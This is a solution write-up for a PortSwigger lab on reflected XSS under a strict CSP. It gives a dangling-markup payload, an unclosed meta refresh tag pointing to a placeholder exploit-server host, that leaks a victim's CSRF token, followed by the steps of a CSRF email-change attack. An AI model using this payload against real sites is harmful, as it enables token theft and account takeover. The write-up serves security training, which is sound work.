# Lab 28 — Reflected XSS protected by very strict CSP, with dangling markup attack

> **Expert** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

**Entry point:** CSP blocks all script execution; the email field is
reflected raw into the page → **dangling markup** captures the CSRF token.

## Solution

1. Set your email to a value that opens an unfinished tag; the browser
   captures everything up to the next quote/angle bracket as part of it:

```
"><meta http-equiv="refresh" content="0;url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net?">
```

2. When the victim views the page (or via the email-change confirmation
   render), the `<meta refresh` never closes — the browser sends the page
   source **after** your injection (including the CSRF token) as the
   redirect's query string.
3. Read the token from the exploit server access log, then host a normal
   CSRF form (email change) with the stolen token.
4. Deliver to victim — lab solved.

## Notes

With scripting dead, dangling markup still leaks page secrets — CSP cannot
stop HTML injection, only script execution.
